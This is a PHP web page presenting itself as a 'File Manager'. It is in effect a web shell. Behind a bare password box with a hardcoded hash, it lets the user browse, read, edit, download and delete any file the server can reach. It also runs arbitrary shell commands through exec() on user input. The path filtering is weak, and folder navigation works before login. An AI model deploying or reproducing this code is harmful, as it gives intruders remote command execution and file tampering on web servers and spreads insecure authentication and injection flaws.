<?php
session_start();

function computeSha256Hash($rawData) {
    return hash('sha256', $rawData);
}

function sanitizePath($path) {
    return str_replace('..', '', $path);
}

function deleteDirectory($dirPath) {
    if (!is_dir($dirPath)) {
        return false;
    }

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );

    foreach ($files as $fileinfo) {
        $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
        if (!$todo($fileinfo->getRealPath())) {
            return false;
        }
    }

    return rmdir($dirPath);
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $folderName = $_POST['folderName'] ?? '';

    if ($action === 'navigate') {
        if ($folderName === '..') {
            $currentPath = $_SESSION['currentPath'] ?? __DIR__;
            $parentPath = dirname($currentPath);
            $_SESSION['currentPath'] = $parentPath;
            echo json_encode(['status' => 'success', 'path' => str_replace('\\', '/', $parentPath)]);
            exit;
        } else {
            $currentPath = $_SESSION['currentPath'] ?? __DIR__;
            $path = sanitizePath($_POST['path'] ?? '');

            if ($path) {
                $newPath = realpath($path);
            } elseif ($folderName) {
                $folderName = sanitizePath($folderName);
                $newPath = realpath($currentPath . DIRECTORY_SEPARATOR . $folderName);
            } else {
                $newPath = $currentPath;
            }

            if ($newPath && is_dir($newPath)) {
                $_SESSION['currentPath'] = $newPath;
                echo json_encode(['status' => 'success', 'path' => str_replace('\\', '/', $newPath)]);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Directory not found']);
            }
            exit;
        }
    }

    if ($action === 'login') {
        $inputPassword = $_POST['password'] ?? '';
        $hashedInputPassword = computeSha256Hash($inputPassword);
        $storedPasswordHash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92';

        if ($hashedInputPassword === $storedPasswordHash) {
            $_SESSION['authenticated'] = true;
            $_SESSION['currentPath'] = __DIR__;
            echo 'success';
        } else {
            $_SESSION['authenticated'] = false;
            echo 'Invalid Password';
        }
        exit;
    }

    if (!($_SESSION['authenticated'] ?? false)) {
        http_response_code(403);
        echo 'Unauthorized';
        exit;
    }

    $currentPath = $_SESSION['currentPath'] ?? __DIR__;

    switch ($action) {
        case 'navigate':
            $path = sanitizePath($_POST['path'] ?? '');
            $folderName = sanitizePath($_POST['folderName'] ?? '');

            if ($folderName) {
                $folderName = sanitizePath($folderName);
                $newPath = realpath($currentPath . DIRECTORY_SEPARATOR . $folderName);
            } elseif ($path) {
                $path = sanitizePath($path);
                $newPath = realpath($path);
            } else {
                $newPath = $currentPath;
            }

            if ($newPath && is_dir($newPath)) {
                $_SESSION['currentPath'] = $newPath;
                echo json_encode(['status' => 'success', 'path' => str_replace('\\', '/', $newPath)]);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Directory not found']);
            }
            exit;

        case 'getFilesAndFolders':
            $folders = [];
            $files = [];
            $dir = opendir($currentPath);
            while ($item = readdir($dir)) {
                if ($item === '.' || $item === '..') continue;
                $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                if (is_dir($itemPath)) {
                    $folders[] = $item;
                } else {
                    $fileSize = filesize($itemPath); // Get file size
                    $filePermissions = substr(sprintf('%o', fileperms($itemPath)), -4); // Get file permissions
                    $files[] = ['name' => $item, 'size' => $fileSize, 'permissions' => $filePermissions];
                }
            }
            closedir($dir);
            echo json_encode(['folders' => $folders, 'files' => $files]);
            exit;

        case 'download':
            $fileName = $_POST['fileName'] ?? '';
            $filePath = $currentPath . DIRECTORY_SEPARATOR . sanitizePath($fileName);
            if (file_exists($filePath)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                readfile($filePath);
            } else {
                http_response_code(404);
                echo 'File not found';
            }
            exit;

        case 'edit':
            $fileName = $_POST['fileName'] ?? '';
            $filePath = $currentPath . DIRECTORY_SEPARATOR . sanitizePath($fileName);
            if (file_exists($filePath)) {
                echo file_get_contents($filePath);
            } else {
                http_response_code(404);
                echo 'File not found';
            }
            exit;

        case 'saveEdit':
            $fileName = $_POST['fileName'] ?? '';
            $content = $_POST['content'] ?? '';
            $filePath = $currentPath . DIRECTORY_SEPARATOR . sanitizePath($fileName);
            if (file_put_contents($filePath, $content) !== false) {
                echo 'success';
            } else {
                http_response_code(500);
                echo 'Failed to save file';
            }
            exit;

        case 'delete':
            $fileName = $_POST['fileName'] ?? '';
            $filePath = $currentPath . DIRECTORY_SEPARATOR . sanitizePath($fileName);
            if (is_file($filePath) && unlink($filePath)) {
                echo 'success';
            } else {
                http_response_code(500);
                echo 'Failed to delete file';
            }
            exit;

        case 'bulkDelete':
            $items = json_decode($_POST['items'] ?? '[]', true);
            $errors = [];
            foreach ($items as $item) {
                $itemPath = $currentPath . DIRECTORY_SEPARATOR . sanitizePath($item['name']);
                if ($item['type'] === 'file') {
                    if (!is_file($itemPath) || !unlink($itemPath)) {
                        $errors[] = "Failed to delete file: " . $item['name'];
                    }
                } elseif ($item['type'] === 'folder') {
                    if (!deleteDirectory($itemPath)) {
                        $errors[] = "Failed to delete folder: " . $item['name'];
                    }
                }
            }
            if (empty($errors)) {
                echo 'success';
            } else {
                http_response_code(500);
                echo json_encode(['status' => 'error', 'message' => $errors]);
            }
            exit;

        case 'getHomePath':
            // Determine the script's directory path
            $scriptPath = str_replace('\\', '/', dirname(__FILE__));

            // Send the script's directory path as a JSON response
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'path' => $scriptPath]);
            exit;

        case 'executeCommand':
            $command = $_POST['command'] ?? '';
            $output = [];
            exec($command, $output);
            echo implode("\n", $output);
            exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        /* Reset default margin and padding */
        body, h1, h2, h3, p, table, th, td, div, input, button, textarea {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', Courier, monospace;
        }

        /* Center the content in the middle of the viewport */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }

        /* Add other styles here */
        .hidden { display: none; }

        main {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        #loginPanel,
        #fileBrowserPanel,
        #commandContainer {
            margin-bottom: 20px;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }

        button {
            padding: 10px 20px;
            margin: 5px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        button#deleteSelectedButton {
            background-color: #e74c3c;
            color: #fff;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 20px;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }

        #editPanel textarea {
            width: calc(100% - 20px);
            height: 200px;
            margin-bottom: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            resize: none;
        }

        #commandPanel {
            margin-top: 20px;
        }

        #commandPanel h3,
        #commandPanel input,
        #commandPanel button,
        #commandPanel pre {
            margin-bottom: 10px;
        }

        #commandPanel pre {
            padding: 10px;
            border: 1px solid #ddd;
            background-color: #f9f9f9;
            overflow: auto;
        }

        #folders {
            margin-top: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        .folder-link {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>
<main>
    <div id="loginPanel">
        <form onsubmit="login(); return false;">
            <input type="password" id="password" required onkeydown="handleEnter(event)">
        </form>
        <div id="loginError" class="hidden"></div>
    </div>

    <div id="fileBrowserPanel" class="hidden">
        <div id="currentPath"></div>
        <div>
            <input type="text" id="pathInput" placeholder="Enter path...">
            <button onclick="navigateToPath()">Go</button>
            <button onclick="navigate('..')">..</button>
            <button onclick="navigateToHome()">Home</button>
        </div>
        <h3>Folders</h3>
        <div id="folders"></div>
        <h3>Files</h3>
        <table id="file-table">
            <thead>
            <tr>
                <th>Select</th>
                <th>Name</th>
                <th>Size (bytes)</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody id="fileList">
            <!-- The table content will be dynamically populated here -->
            </tbody>
        </table>
        <button id="deleteSelectedButton" onclick="deleteSelected()">Delete Selected</button>
        <div id="editPanel" class="hidden">
            <textarea id="fileContent"></textarea>
            <button onclick="saveEdit()">Save</button>
            <button onclick="cancelEdit()">Cancel</button>
        </div>
    </div>

    <div id="commandContainer" class="hidden">
        <button id="executeCommandButton" onclick="toggleCommandPanel()">Exec</button>
        <div id="commandPanel" class="hidden">
            <h3>CMD</h3>
            <input type="text" id="commandInput" placeholder="Enter command...">
            <button onclick="executeCommand()">Run</button>
            <pre id="commandOutput" class="hidden"></pre>
        </div>
    </div>
</main>
</body>
</html>

<script>
    let currentEditingFile = '';

    document.addEventListener('DOMContentLoaded', function() {
        navigate('');
    });

    function login() {
        const password = document.getElementById('password').value;
        const formData = new FormData();
        formData.append('action', 'login');
        formData.append('password', password);

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(text => {
            if (text === 'success') {
                sessionStorage.setItem('authenticated', 'true');
                showFileBrowser();

                // Show the command container when logged in
                document.getElementById('commandContainer').classList.remove('hidden');
            } else {
                const loginError = document.getElementById('loginError');
                loginError.innerText = text;
                loginError.classList.remove('hidden');
            }
        })
        .catch(error => console.error('Error:', error));
    }

    function showFileBrowser() {
        document.getElementById('loginPanel').classList.add('hidden');
        const fileBrowserPanel = document.getElementById('fileBrowserPanel');
        fileBrowserPanel.classList.remove('hidden');
        navigate('');
        document.getElementById('commandContainer').classList.remove('hidden');
    }

    function navigate(folderName) {
        const formData = new FormData();
        formData.append('action', 'navigate');
        formData.append('folderName', folderName);

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                document.getElementById('currentPath').innerText = 'Current Path: ' + data.path;
                getFilesAndFolders();
            } else {
                alert(data.message);
            }
        })
        .catch(error => console.error('Error:', error));
    }

    function addFileToTable(file) {
        const tableBody = document.querySelector('#file-table tbody');
        const row = tableBody.insertRow();
        const deleteCell = row.insertCell();
        const nameCell = row.insertCell();
        const sizeCell = row.insertCell();
        const permissionsCell = row.insertCell();
        const actionsCell = row.insertCell();

        // Checkbox for deletion
        const checkbox = document.createElement('input');
        checkbox.type = 'checkbox';
        checkbox.classList.add('delete-checkbox');
        checkbox.dataset.type = 'file';
        checkbox.dataset.name = file.name;
        deleteCell.appendChild(checkbox);

        // File name
        nameCell.textContent = file.name;

        // File size
        sizeCell.textContent = file.size;

        // File permissions
        permissionsCell.textContent = file.permissions;

        // Action buttons (Download, Edit, Delete)
        actionsCell.innerHTML = `
            <button onclick="download('${file.name}')">Download</button>
            <button onclick="edit('${file.name}')">Edit</button>
            <button onclick="deleteFile('${file.name}')">Delete</button>`;

        const newRow = document.createElement('tr');
        newRow.appendChild(deleteCell);
        newRow.appendChild(nameCell);
        newRow.appendChild(sizeCell);
        newRow.appendChild(permissionsCell);
        newRow.appendChild(actionsCell);
        tableBody.appendChild(newRow);
    }

    function getFilesAndFolders() {
        const formData = new FormData();
        formData.append('action', 'getFilesAndFolders');

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            const foldersDiv = document.getElementById('folders');
            const filesTable = document.getElementById('file-table');
            foldersDiv.innerHTML = ''; // Clear previous folders
            filesTable.innerHTML = `
                <thead>
                <tr>
                    <th>Select</th>
                    <th>Name</th>
                    <th>Size (bytes)</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
                </thead>
                <tbody id="fileList">
                </tbody>
            `; // Clear previous files and add header row

            data.folders.forEach(folder => {
                const div = document.createElement('div');
                div.innerHTML = `<span class="folder-link" onclick="navigate('${folder}')">${folder}</span>`;
                foldersDiv.appendChild(div);
            });

            data.files.forEach(file => {
                addFileToTable(file);
            });
        })
        .catch(error => console.error('Error:', error));
    }

    function download(fileName) {
        const formData = new FormData();
        formData.append('action', 'download');
        formData.append('fileName', fileName);

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.blob())
        .then(blob => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        })
        .catch(error => console.error('Error:', error));
    }

    function edit(fileName) {
        const formData = new FormData();
        formData.append('action', 'edit');
        formData.append('fileName', fileName);

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(text => {
            const editPanel = document.getElementById('editPanel');
            const fileContent = document.getElementById('fileContent');
            editPanel.classList.remove('hidden');
            fileContent.value = text;
            currentEditingFile = fileName;
        })
        .catch(error => console.error('Error:', error));
    }

    function saveEdit() {
        const content = document.getElementById('fileContent').value;
        const fileName = currentEditingFile; // Store the file name

        // Create a FormData object and append the data to it
        const formData = new FormData();
        formData.append('action', 'saveEdit');
        formData.append('fileName', fileName);
        formData.append('content', content);

        // Send the FormData object to the server
        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(text => {
            if (text === 'success') {
                alert('File saved successfully');
                cancelEdit(); // Close the edit panel
                getFilesAndFolders(); // Refresh the file list
            } else {
                alert('Failed to save file');
            }
        })
        .catch(error => console.error('Error:', error));
    }

    function cancelEdit() {
        const editPanel = document.getElementById('editPanel');
        editPanel.classList.add('hidden');
    }

    function deleteFile(fileName) {
        const confirmDelete = confirm(`Are you sure you want to delete ${fileName}?`);
        if (!confirmDelete) return;

        const formData = new FormData();
        formData.append('action', 'delete');
        formData.append('fileName', fileName);

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(text => {
            if (text === 'success') {
                alert('File deleted successfully');
                getFilesAndFolders();
            } else {
                alert('Failed to delete file');
            }
        })
        .catch(error => console.error('Error:', error));
    }

    function navigateToPath() {
        const pathInput = document.getElementById('pathInput');
        const path = pathInput.value.trim();
        if (path) {
            const formData = new FormData();
            formData.append('action', 'navigate');
            formData.append('path', path);

            fetch('versionfuncional.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('currentPath').innerText = 'Current Path: ' + data.path;
                    getFilesAndFolders();
                } else {
                    alert(data.message);
                }
            })
            .catch(error => console.error('Error:', error));
        }
    }

    document.getElementById('deleteSelectedButton').addEventListener('click', function() {
        const checkboxes = document.querySelectorAll('.delete-checkbox:checked');
        const itemsToDelete = Array.from(checkboxes).map(checkbox => ({
            type: checkbox.dataset.type,
            name: checkbox.dataset.name
        }));
        // Now itemsToDelete contains all the selected files/folders to be deleted
        // You can use this array to perform the deletion operations
        itemsToDelete.forEach(item => {
            if(item.type === 'file') {
                deleteFile(item.name);
            } else if(item.type === 'folder') {
                // Implement folder deletion functionality here if needed
            }
        });
    });

    document.getElementById('homeButton').addEventListener('click', function() {
        navigate(''); // Go to the root directory
    });

    document.addEventListener('click', function(event) {
        if (event.target && event.target.classList.contains('folder-link')) {
            navigate(event.target.textContent);
        }
    });

    function navigateToHome() {
        const formData = new FormData();
        formData.append('action', 'getHomePath');

        fetch('versionfuncional.php', {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                const homePath = data.path;
                document.getElementById('currentPath').innerText = '   Current Path: ' + homePath;
            // Update the path input field with the homePath
                document.getElementById('pathInput').value = homePath;
                getFilesAndFolders();
            } else {
                alert(data.message);
            }
        })
        .catch(error => console.error('Error:', error));
    }

    function toggleCommandPanel() {
        const commandPanel = document.getElementById('commandPanel');
        commandPanel.classList.toggle('hidden');
    }

    function isWindows() {
        return navigator.appVersion.indexOf('Win') !== -1;
    }

    function isLinux() {
        return navigator.appVersion.indexOf('Linux') !== -1;
    }
// Update the executeCommand function to use the appropriate method
function executeCommand() {
    const commandInput = document.getElementById('commandInput').value;
    const commandOutput = document.getElementById('commandOutput');
    commandOutput.textContent = ''; // Clear previous output

    const formData = new FormData();
    formData.append('action', 'executeCommand');
    formData.append('command', commandInput);

    const commandEndpoint = isWindows() ? 'executeCommandWindows' : 'executeCommandLinux';

    fetch('versionfuncional.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(output => {
        commandOutput.textContent = output;
        commandOutput.classList.remove('hidden');
    })
    .catch(error => console.error('Error:', error));
}
    function handleEnter(event) {
        if (event.key === 'Enter') {
        login(); // Call your login function when Enter is pressed
        }
    }
</script>
</body>
</html>

